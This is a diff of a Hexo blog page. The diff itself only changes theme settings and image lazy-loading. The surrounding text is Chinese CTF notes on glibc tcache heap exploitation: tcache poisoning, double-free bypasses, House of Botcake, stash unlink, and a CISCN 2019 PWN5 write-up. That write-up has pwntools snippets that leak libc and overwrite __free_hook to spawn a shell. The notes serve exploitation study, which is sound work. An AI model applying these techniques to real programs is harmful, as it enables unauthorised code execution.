@@ -35,7 +35,7 @@
     <script class="keep-theme-configurations">
     const KEEP = window.KEEP || {}
     KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.json"}
-    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Zach0ry's home","author":"Zach0ry","avatar":"/images/av.jpg","logo":"/images/123.png","favicon":"/images/123.png"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":true},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":null,"category":false,"tag":false,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":false,"min2read":false},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":false,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"local_search":{"enable":false,"preload":false},"comment":{"enable":true,"use":"giscus","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":"zach0ry-zzh/zach0ry-zzh.github.io","repo_id":"R_kgDOPKvC2Q","category":"Comments","category_id":"DIC_kwDOPKvC2c4DByYU","reactions_enabled":true},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":false,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Zach0ry's home","author":"Zach0ry","avatar":"/images/av.jpg","logo":"/images/123.png","favicon":"/images/123.png"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":true},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":false,"hide_header":true},"home":{"announcement":null,"category":false,"tag":true,"post_datetime":"created"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":false},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":true,"reward":{"enable":true,"img_link":"/images/zfb.jpg","text":"请作者喝杯咖啡","icon":"/images/tea.svg"}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":false,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":true,"use":"giscus","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":"zach0ry-zzh/zach0ry-zzh.github.io","repo_id":"R_kgDOPKvC2Q","category":"Comments","category_id":"DIC_kwDOPKvC2c4DByYU","reactions_enabled":true},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":true},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":false,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
     KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
     KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
     KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original post title","author":"Original post author","link":"Original post link"}
@@ -45,6 +45,8 @@
 
 <body>
 <div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
     
 
     
@@ -119,9 +121,15 @@
                         </li>
                     
                     
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
                 </ul>
             </div>
             <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                 
                 <div class="icon-item menu-bar">
                     <div class="menu-bar-middle"></div>
@@ -273,6 +281,10 @@
         
         
         
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
     </div>
 
     
@@ -410,9 +422,19 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">This file demonstrates a simple tcache poisoning attack by tricking malloc into</span><br><span class="line">returning a pointer to an arbitrary location (in this case, the stack).</span><br><span class="line">The attack is very similar to fastbin corruption attack.</span><br><span class="line">After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,</span><br><span class="line">We have to create and free one more chunk for padding before fd pointer hijacking.</span><br><span class="line"></span><br><span class="line">The address we want malloc() to return is 0x7ffe8ecf4778.</span><br><span class="line">Allocating 2 buffers.</span><br><span class="line">malloc(128): 0x564de7a1e260</span><br><span class="line">malloc(128): 0x564de7a1e2f0</span><br><span class="line">Freeing the buffers...</span><br><span class="line">Now the tcache list has [ 0x564de7a1e2f0 -&gt; 0x564de7a1e260 ].</span><br><span class="line">We overwrite the first 8 bytes (fd/next pointer) of the data at 0x564de7a1e2f0</span><br><span class="line">to point to the location to control (0x7ffe8ecf4778).</span><br><span class="line">Now the tcache list has [ 0x564de7a1e2f0 -&gt; 0x7ffe8ecf4778 ].</span><br><span class="line">1st malloc(128): 0x564de7a1e2f0</span><br><span class="line">Now the tcache list has [ 0x7ffe8ecf4778 ].</span><br><span class="line">2nd malloc(128): 0x7ffe8ecf4778</span><br><span class="line">We got the control</span><br></pre></td></tr></table></figure>
 
 <p>a，b首次free之后</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251202172251803.png"  alt="image-20251202172251803"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251202172251803.png"
+                        alt="image-20251202172251803"
+                 ></p>
 <p>修改b的next指针</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251202172751216.png"  alt="image-20251202172751216"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251202172751216.png"
+                        alt="image-20251202172751216"
+                 ></p>
 <p>即可malloc到目标位置，tcache的校验不严格</p>
 <p>可以看出，<code>tcache_put()</code> 的检查也可以忽略不计（甚至没有对 <code>tcache-&gt;counts[tc_idx]</code> 的检查），大幅提高性能的同时安全性也下降了很多。</p>
 <p>因为没有任何检查，所以我们可以对同一个 chunk 多次 free，造成 cycliced list。</p>
@@ -434,8 +456,18 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">static __always_inline void</span><br><span class="line">tcache_put (mchunkptr chunk, size_t tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>直接就是两次free</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/81110d2239ab6693a67ba266f0c2c042.png"  alt="image-20240719161330250"></p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/34d418628d8fa8d65c55b871ac5675f9.png"  alt="image-20240719161523304"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/81110d2239ab6693a67ba266f0c2c042.png"
+                        alt="image-20240719161330250"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/34d418628d8fa8d65c55b871ac5675f9.png"
+                        alt="image-20240719161523304"
+                 ></p>
 <p>glibc 2.29 相比 2.27 的 <strong>tcache dup（tcachebin double free）</strong> 主要改动是：<strong>加强了 double free 检测，靠 <code>tcache_entry-&gt;key</code> 阻止同一 chunk 被再次放回同一个 tcache bin</strong>，使得 2.27 那种“直接 double free 同一块进 tcache”不再可行</p>
 <p>在 2.29 下，只要 A 还在对应 tcache bin 里，第二次 free(A) 就会因为 key 检测被拦截。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    size_t tc_idx = csize2tidx (size);</span><br><span class="line">    if (tcache != NULL &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">        /* Check to see if it&#x27;s already in the tcache.  */</span><br><span class="line">        tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line"></span><br><span class="line">        /* This test succeeds on double free.  However, we don&#x27;t 100%</span><br><span class="line">           trust it ... so verify it&#x27;s not an unlikely coincidence</span><br><span class="line">           before aborting.  */</span><br><span class="line">        if (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">        &#123;</span><br><span class="line">            tcache_entry *tmp;</span><br><span class="line">            LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);</span><br><span class="line"></span><br><span class="line">            for (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">                 tmp;</span><br><span class="line">                 tmp = tmp-&gt;next)</span><br><span class="line">                if (tmp == e)</span><br><span class="line">                    malloc_printerr (&quot;free(): double free detected in tcache 2&quot;);</span><br><span class="line"></span><br><span class="line">            /* If we get here, it was a coincidence.  */</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">        &#123;</span><br><span class="line">            tcache_put (p, tc_idx);</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -482,11 +514,26 @@
 
 
 <p>7次free之后</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251202204753415.png"  alt="image-20251202204753415"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251202204753415.png"
+                        alt="image-20251202204753415"
+                 ></p>
 <p>pqpfree之后</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251202205029945.png"  alt="image-20251202205029945"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251202205029945.png"
+                        alt="image-20251202205029945"
+                 ></p>
 <p>8次malloc之后移进tcache bin</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251202210528530.png"  alt="image-20251202210528530"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251202210528530.png"
+                        alt="image-20251202210528530"
+                 ></p>
 <h4 id="改-size"><a href="#改-size" class="headerlink" title="改 size"></a>改 size</h4><p><strong>思路二：off-by-null 改 size，让两次 free 落到不同 tc_idx 绕过检测</strong></p>
 <p><strong>核心背景：</strong></p>
 <ul>
@@ -518,9 +565,19 @@
 </ol>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;time.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#define __free_hook 0x7ffff7fb45a8</span><br><span class="line">#define system 0x7ffff7e1ffd0</span><br><span class="line"></span><br><span class="line">void init() &#123;</span><br><span class="line">	setvbuf(stdout, 0, 2, 0);</span><br><span class="line">	setvbuf(stdin, 0, 1, 0);</span><br><span class="line">	setvbuf(stderr, 0, 1, 0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;	</span><br><span class="line">	long size1 = 0x108;</span><br><span class="line">	long size2 = 0xf8;</span><br><span class="line">	long long *p,*q,*r,*junk;</span><br><span class="line">	init();</span><br><span class="line">	p = malloc(size1);</span><br><span class="line">	free(p);</span><br><span class="line">	*((char *)p - 8) = 0;//改size,绕过检验</span><br><span class="line">	free(p);</span><br><span class="line"></span><br><span class="line">	p = malloc(size1);</span><br><span class="line">	p[0] = __free_hook;</span><br><span class="line">	sleep(0);</span><br><span class="line"></span><br><span class="line">	q = malloc(size2);</span><br><span class="line">	r = malloc(size2);</span><br><span class="line">	printf(&quot;%p\n&quot;,r);</span><br><span class="line">	sleep(0);</span><br><span class="line"></span><br><span class="line">	r[0] = system;</span><br><span class="line"></span><br><span class="line">	strcpy(q,&quot;/bin/sh&quot;);</span><br><span class="line">	free(q);</span><br><span class="line">	sleep(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251202210009015.png"  alt="image-20251202210009015"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251202210009015.png"
+                        alt="image-20251202210009015"
+                 ></p>
 <p>修改size之后重新free</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251202210130594.png"  alt="image-20251202210130594"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251202210130594.png"
+                        alt="image-20251202210130594"
+                 ></p>
 <h4 id="House-of-Botcake"><a href="#House-of-Botcake" class="headerlink" title="House of Botcake"></a>House of Botcake</h4><p><a class="link"   target="_blank" rel="noopener" href="https://forum.butian.net/share/1709" >奇安信<i class="fas fa-external-link-alt"></i></a></p>
 <p>分配七个填充堆块（小于最大的Tcache，大于最大的Fastbin），一个辅助堆块 prev ，一个利用堆块 victim</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c</span></span><br><span class="line">    <span class="type">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="type">intptr_t</span>*); i++)&#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">// 防止合并</span></span><br></pre></td></tr></table></figure>
@@ -543,7 +600,12 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;assert.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	setbuf(stdout, NULL);</span><br><span class="line">	malloc(1);</span><br><span class="line">	unsigned long long *a; //pointer that will be overwritten</span><br><span class="line">	unsigned long long fake_chunks[10] __attribute__((aligned(0x10))); //fake chunk region</span><br><span class="line">    </span><br><span class="line">	</span><br><span class="line">	fake_chunks[1] = 0x40; // this is the size</span><br><span class="line">	a = &amp;fake_chunks[2];</span><br><span class="line">	free(a);</span><br><span class="line">    </span><br><span class="line">	void *b = malloc(0x30);</span><br><span class="line"></span><br><span class="line">	assert((long)b == (long)&amp;fake_chunks[2]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>下图可以看到free 目标地址会把它放入tcache中</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251205185144206.png"  alt="image-20251205185144206"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251205185144206.png"
+                        alt="image-20251205185144206"
+                 ></p>
 <h3 id="tcache-stash-unlink"><a href="#tcache-stash-unlink" class="headerlink" title="tcache_stash_unlink"></a>tcache_stash_unlink</h3><p>这种攻击利用的是 tcache bin 有剩余 (数量小于 <code>TCACHE_MAX_BINS</code> ) 时，同大小的 small bin 会放进 tcache 中 (这种情况可以用 <code>calloc</code> 分配同大小堆块触发，因为 <code>calloc</code> 分配堆块时不从 tcache bin 中选取)。在获取到一个 <code>smallbin</code> 中的一个 chunk 后会如果 tcache 仍有足够空闲位置，会将剩余的 small bin 链入 tcache ，在这个过程中只对第一个 bin 进行了完整性检查，后面的堆块的检查缺失。当攻击者可以写一个 small bin 的 bk 指针时，其可以在任意地址上写一个 libc 地址 (类似 <code>unsorted bin attack</code> 的效果)。构造得当的情况下也可以分配 fake chunk 到任意地址。</p>
 <p>利用 glibc 2.27&#x2F;2.29 的一个机制：</p>
 <blockquote>
@@ -559,25 +621,55 @@
 
 
 <p>9个chunk全部free之后(进入unsorted的两个chunk不相邻，担心合并)</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251205194824157.png"  alt="image-20251205194824157"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251205194824157.png"
+                        alt="image-20251205194824157"
+                 ></p>
 <p>malloc(0xa0)让chunk从unsorted进入small</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251205194900238.png"  alt="image-20251205194900238"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251205194900238.png"
+                        alt="image-20251205194900238"
+                 ></p>
 <p>再两次malloc从tcache取出</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251205195304101.png"  alt="image-20251205195304101"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251205195304101.png"
+                        alt="image-20251205195304101"
+                 ></p>
 <p>改chunk2的bk</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251205195601315.png"  alt="image-20251205195601315"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251205195601315.png"
+                        alt="image-20251205195601315"
+                 ></p>
 <p>calloc 从 smallbin 取 chunk0个后，会把chunk2塞进进 tcache</p>
 <blockquote>
 <p><strong>当 glibc 从 smallbin 里拿到一个 chunk 来满足分配时，如果发现 tcache 这个 size 的 bin 还有空位，就会把 smallbin 里剩下的同尺寸 chunk 也一起搬进 tcache 里备用。</strong><br>这批“搬进去备用”的动作就叫 <strong>stashing（塞缓存&#x2F;存货）</strong>。</p>
 </blockquote>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bck = C2-&gt;bk;</span><br><span class="line">fwd = C2-&gt;fd;</span><br><span class="line">bck-&gt;fd = fwd;#-&gt;stack_var[2]=main_arena</span><br><span class="line">fwd-&gt;bk = bck;</span><br></pre></td></tr></table></figure>
 
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251205201011108.png"  alt="image-20251205201011108"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251205201011108.png"
+                        alt="image-20251205201011108"
+                 ></p>
 <h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="CISCN-2019东南-PWN5"><a href="#CISCN-2019东南-PWN5" class="headerlink" title="[CISCN 2019东南]PWN5"></a>[CISCN 2019东南]PWN5</h3><p>delete没有uaf</p>
 <p>edit输入size个字符</p>
 <p>add有管理chunk</p>
 <p>edit的realloc</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251207161927575.png"  alt="image-20251207161927575"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251207161927575.png"
+                        alt="image-20251207161927575"
+                 ></p>
 <h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p><strong>1.tcache的覆盖范围</strong></p>
 <p>tcache 覆盖的最大 <strong>chunk size</strong> 是 <code>0x410</code>（对应 bin index 63 的 size class 是 0x420? 这里注意不同版本的定义方式，但结论一致：用户 size 上限是 0x408）</p>
 <p><strong>2.<code>realloc</code> 的规则可以记成：</strong></p>
@@ -637,9 +729,19 @@
 <p>先把chunk放入unsorted bin中泄露libc_base</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">add(0x410)#0</span><br><span class="line">add(0x10)</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">add(0x410,b&quot;a&quot;*0x8)</span><br><span class="line">show(0)</span><br><span class="line">#dbg()</span><br><span class="line">p.recvuntil(b&quot;a&quot;*8)</span><br><span class="line">hook=u64(p.recv(6).ljust(0x8,b&#x27;\x00&#x27;))-0x70</span><br><span class="line">libc_base=hook-libc.sym[&#x27;__malloc_hook&#x27;]</span><br><span class="line">free_hook=libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">system=libc_base+libc.sym[&#x27;system&#x27;]</span><br></pre></td></tr></table></figure>
 
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251207164313034.png"  alt="image-20251207164313034"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251207164313034.png"
+                        alt="image-20251207164313034"
+                 ></p>
 <p>malloc(0),使得合适的位置的为0以触发uaf</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251207161616433.png"  alt="image-20251207161616433"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251207161616433.png"
+                        alt="image-20251207161616433"
+                 ></p>
 <p>用relloc实现double free</p>
 <p>之后就可以覆盖了</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add(0)#2</span><br><span class="line">sla(b&quot;Your choice:&quot;,str(2))</span><br><span class="line">sla(b&quot;Index:&quot;,str(2))</span><br><span class="line">delete(2)</span><br><span class="line">one_gadget=libc_base+0x4f302</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x10,p64(free_hook))</span><br><span class="line">add(0x10,p64(one_gadget))</span><br><span class="line"></span><br><span class="line">delete(0)</span><br></pre></td></tr></table></figure>
@@ -668,15 +770,30 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">for _ in range(7):</span><br><span class="line">    add(0x80)</span><br><span class="line"></span><br><span class="line">add(0x80)#7</span><br><span class="line">add(0x80)#8</span><br><span class="line">add(0x80)#隔开</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">    delet(i)</span><br><span class="line"></span><br><span class="line">delet(8)</span><br><span class="line">#dbg()</span><br></pre></td></tr></table></figure>
 
 <p>把tcache bin塞满，之后隔绝开，接着free会进入unsortedbin</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251204200704711.png"  alt="vmmap"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251204200704711.png"
+                        alt="vmmap"
+                 ></p>
 <p>算偏移找libc基址</p>
